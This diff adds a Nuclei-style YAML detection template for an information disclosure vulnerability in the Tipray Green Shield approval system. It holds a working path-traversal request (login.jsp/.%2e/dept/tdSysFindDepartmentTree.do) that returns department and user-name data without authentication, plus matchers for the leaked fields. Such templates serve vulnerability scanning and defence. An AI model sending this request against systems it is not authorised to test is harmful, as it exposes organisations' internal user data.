@@ -1,0 +1,45 @@
+id: poc-yaml-tipray-gsas-tdsysfinddepartmenttree-do-info-leak
+info:
+  name: 天锐绿盾审批系统 tdSysFindDepartmentTree.do 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+  description: |
+    This template detects an information disclosure vulnerability in 天锐绿盾审批系统 (Tipray Green Shield Approval System) via the tdSysFindDepartmentTree.do endpoint.
+http:
+  - raw:
+      - |
+        GET /trwfe/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "天锐绿盾审批系统"
+  - raw:
+      - |
+        GET /trwfe/login.jsp/.%2e/dept/tdSysFindDepartmentTree.do HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"parentId\":"
+          - "\"userNameArr\":"
+          - "\"persistentState\":"
+          - "\"parentName\":"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
